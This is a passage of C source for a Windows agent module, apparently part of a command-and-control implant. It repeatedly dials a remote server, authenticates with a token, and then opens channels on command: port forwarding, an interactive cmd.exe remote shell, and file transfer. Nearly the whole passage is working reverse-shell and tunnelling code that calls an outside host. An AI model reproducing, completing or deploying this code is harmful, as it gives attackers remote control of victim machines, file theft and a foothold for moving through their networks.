		send_ctrl(chan, "error", job, NULL, "bad mode", -1, NULL, -1);
		return;
	}
	if (chunk == 0 || chunk > 4 * 1024 * 1024)
		chunk = 512 * 1024;

	x = (FILE_CTX*)MemAllocLocal(sizeof(FILE_CTX));
	c = (RCP_CHAN*)MemAllocLocal(sizeof(RCP_CHAN));
	if (!x || !c) {
		if (x) MemFreeLocal((LPVOID*)&x, sizeof(FILE_CTX));
		if (c) MemFreeLocal((LPVOID*)&c, sizeof(RCP_CHAN));
		send_ctrl(chan, "error", job, NULL, "oom", -1, NULL, -1);
		return;
	}
	memset(x, 0, sizeof(*x));
	memset(c, 0, sizeof(*c));
	x->mode = m;
	x->chunk = chunk;
	copy_str(x->job, sizeof(x->job), job);
	copy_str(x->path, sizeof(x->path), path);
	c->id = chan;
	c->kind = 3;
	c->sock = INVALID_SOCKET;
	c->evt = ApiWin->CreateEventA(NULL, FALSE, FALSE, NULL);
	if (!c->evt) {
		MemFreeLocal((LPVOID*)&x, sizeof(FILE_CTX));
		MemFreeLocal((LPVOID*)&c, sizeof(RCP_CHAN));
		send_ctrl(chan, "error", job, NULL, "event failed", -1, NULL, -1);
		return;
	}
	x->c = c;
	chan_add(c);
	RLOG("[rcp] file chan %u mode=%s job=%s\n", chan, mode, job ? job : "");
	th = ApiWin->CreateThread(NULL, 0, file_thread, x, 0, NULL);
	if (th)
		ApiWin->CloseHandle(th);
	else {
		ensure_cs();
		EnterCriticalSection(&g_chanCs);
		q_clear(c);
		ApiWin->CloseHandle(c->evt);
		c->evt = NULL;
		LeaveCriticalSection(&g_chanCs);
		chan_remove(c);
		MemFreeLocal((LPVOID*)&x, sizeof(FILE_CTX));
		MemFreeLocal((LPVOID*)&c, sizeof(RCP_CHAN));
		send_ctrl(chan, "error", job, NULL, "thread failed", -1, NULL, -1);
	}
}

static void handle_open(RCP_FRAME* f)
{
	WJVal* op;
	WJVal* args;
	WJVal* tg;
	uint32_t chan;
	const char* kind;
	if (!f->payload || !f->len)
		return;
	op = WJParse((const char*)f->payload, f->len);
	if (!op)
		return;
	chan = (uint32_t)WJNumAsI64(WJObjGet(op, "chan"), 0);
	kind = wj_str(WJObjGet(op, "kind"));
	args = WJObjGet(op, "args");
	if (kind && StrCmpA(kind, "fwd") == 0) {
		tg = args && args->type == WJ_OBJ ? WJObjGet(args, "target") : NULL;
		if (tg && tg->type == WJ_STR && tg->str && tg->str[0])
			start_fwd(chan, tg->str);
		else
			send_close(chan, "bad target");
	}
	else if (kind && StrCmpA(kind, "shell") == 0) {
		start_shell(chan);
	}
	else if (kind && StrCmpA(kind, "file") == 0) {
		start_file(chan, args);
	}
	else {
		send_close(chan, "unsupported kind");
	}
	WJFree(op);
}

static void handle_frame(RCP_FRAME* f)
{
	RCP_CHAN* c;
	SOCKET fwdSock = INVALID_SOCKET;
	HANDLE inW = NULL;
	if (!f->len)
		return;
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	c = chan_find_locked(f->chan);
	if (c && c->kind == 1) {
		if (c->sock != INVALID_SOCKET)
			fwdSock = c->sock;
		else
			pend_append(c, f->payload, f->len);
	}
	else if (c && c->kind == 2) {
		inW = c->inW;
	}
	else if (c && c->kind == 3) {
		if (!q_push(c, f->payload, f->len, f->flags)) {
			InterlockedExchange(&c->stop, 1);
			if (c->evt)
				ApiWin->SetEvent(c->evt);
		}
	}
	LeaveCriticalSection(&g_chanCs);
	if (fwdSock != INVALID_SOCKET) {
		send_all(fwdSock, f->payload, f->len);
	}
	else if (inW) {
		// cmd.exe reading from a pipe needs CRLF; xterm sends CR for Enter.
		ULONG i, need = 0, o = 0;
		BYTE* tmp;
		DWORD wr = 0;
		for (i = 0; i < f->len; i++) {
			need++;
			if (f->payload[i] == '\r' && (i + 1 >= f->len || f->payload[i + 1] != '\n'))
				need++;
		}
		if (need == f->len) {
			ApiWin->WriteFile(inW, f->payload, f->len, &wr, NULL);
		}
		else {
			tmp = (BYTE*)MemAllocLocal(need);
			if (tmp) {
				for (i = 0; i < f->len; i++) {
					tmp[o++] = f->payload[i];
					if (f->payload[i] == '\r' && (i + 1 >= f->len || f->payload[i + 1] != '\n'))
						tmp[o++] = '\n';
				}
				ApiWin->WriteFile(inW, tmp, o, &wr, NULL);
				MemFreeLocal((LPVOID*)&tmp, need);
			}
		}
	}
}

static void handle_close(RCP_FRAME* f)
{
	WJVal* v;
	uint32_t chan = 0;
	RCP_CHAN* c;
	if (!f->payload || !f->len)
		return;
	v = WJParse((const char*)f->payload, f->len);
	if (!v)
		return;
	chan = (uint32_t)WJNumAsI64(WJObjGet(v, "chan"), 0);
	WJFree(v);
	ensure_cs();
	EnterCriticalSection(&g_chanCs);
	c = chan_find_locked(chan);
	if (c) {
		InterlockedExchange(&c->stop, 1);
		if (c->kind == 2)
			shell_cleanup(c);
		else if (c->kind == 3) {
			if (c->evt)
				ApiWin->SetEvent(c->evt);
		}
		else if (c->sock != INVALID_SOCKET) {
			ApiWin->closesocket(c->sock);
			c->sock = INVALID_SOCKET;
		}
		pend_free(c);
	}
	LeaveCriticalSection(&g_chanCs);
}

//////// session ////////

static BOOL handshake(SOCKET s)
{
	WJVal* h = WJNewObj();
	char* js;
	DWORD tv;
	RCP_FRAME f;
	BOOL good = FALSE;
	if (!h) return FALSE;
	WJObjPutStr(h, "agent", g_agent);
	WJObjPutStr(h, "token", g_token);
	js = WJSerialize(h);
	WJFree(h);
	if (!js) return FALSE;
	if (!rcp_send(0, RCP_KIND_HELLO, 0, js, StrLenA(js))) {
		ULONG n = StrLenA(js);
		MemFreeLocal((LPVOID*)&js, n + 1);
		return FALSE;
	}
	{
		ULONG n = StrLenA(js);
		MemFreeLocal((LPVOID*)&js, n + 1);
	}
	tv = 10000;
	ApiWin->setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
	if (rcp_read(s, &f)) {
		if (f.kind == RCP_KIND_ACK && f.payload && f.len) {
			WJVal* v = WJParse((const char*)f.payload, f.len);
			if (v) {
				WJVal* ok = WJObjGet(v, "ok");
				if (ok && ok->type == WJ_BOOL && ok->b)
					good = TRUE;
				else {
					WJVal* r = WJObjGet(v, "reason");
					RLOG("[rcp] rejected: %s\n", r && r->type == WJ_STR ? r->str : "?");
				}
				WJFree(v);
			}
		}
		frame_free(&f);
	}
	tv = 90000;
	ApiWin->setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
	RLOG(good ? "[rcp] connected\n" : "[rcp] handshake failed\n");
	return good;
}

static void reader_loop(SOCKET s)
{
	RCP_FRAME f;
	while (g_wanted) {
		if (!rcp_read(s, &f))
			break;
		switch (f.kind) {
		case RCP_KIND_OPEN:  handle_open(&f); break;
		case RCP_KIND_FRAME: handle_frame(&f); break;
		case RCP_KIND_CLOSE: handle_close(&f); break;
		case RCP_KIND_PING:  rcp_send(f.chan, RCP_KIND_PONG, 0, NULL, 0); break;
		default: break;
		}
		frame_free(&f);
	}
}

static DWORD WINAPI rcp_thread(LPVOID param)
{
	WSADATA wsa;
	(void)param;
	if (!ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->connect) {
		RLOG("[rcp] winsock unavailable\n");
		return 0;
	}
	if (ApiWin->WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		RLOG("[rcp] WSAStartup failed\n");
		return 0;
	}
	while (g_wanted) {
		SOCKET s;
		RLOG("[rcp] dialing %s\n", g_addr);
		s = tcp_connect(g_addr);
		if (s == INVALID_SOCKET) {
			RLOG("[rcp] dial failed\n");
			ApiWin->Sleep(5000);
			continue;
		}
		g_sock = s;
		if (!handshake(s)) {
			ApiWin->closesocket(s);
			if (g_sock == s) g_sock = INVALID_SOCKET;
			if (g_wanted) ApiWin->Sleep(5000);
			continue;
		}
		reader_loop(s);
		if (g_sock == s) g_sock = INVALID_SOCKET;
		ApiWin->closesocket(s);
		chan_stop_all();
		if (g_wanted) {
			RLOG("[rcp] lost, redial in 5s\n");
			ApiWin->Sleep(5000);
		}
	}
	ApiWin->WSACleanup();
	return 0;
}

BOOL WispRcpStart(const char* addr, const char* token, const char* agentId)
{
	ensure_cs();
	WispRcpStop();
	copy_str(g_addr, sizeof(g_addr), addr);
	copy_str(g_token, sizeof(g_token), token);
	copy_str(g_agent, sizeof(g_agent), agentId);
	if (!g_addr[0]) {
		RLOG("[rcp] no address\n");
		return FALSE;
	}
	InterlockedExchange(&g_wanted, 1);
	g_thread = ApiWin->CreateThread(NULL, 0, rcp_thread, NULL, 0, NULL);
	if (!g_thread) {
		InterlockedExchange(&g_wanted, 0);
		return FALSE;
	}
	return TRUE;
}

void WispRcpStop(void)
{
	SOCKET s;
	ensure_cs();
	InterlockedExchange(&g_wanted, 0);
	s = g_sock;
	if (s != INVALID_SOCKET)
		ApiWin->closesocket(s);
	if (g_thread) {
		ApiWin->WaitForSingleObject(g_thread, 8000);
		ApiWin->CloseHandle(g_thread);
		g_thread = NULL;
	}
	g_sock = INVALID_SOCKET;
	chan_stop_all();
}

BOOL WispRcpRunning(void)
{
	return g_thread != NULL && g_wanted != 0;
}
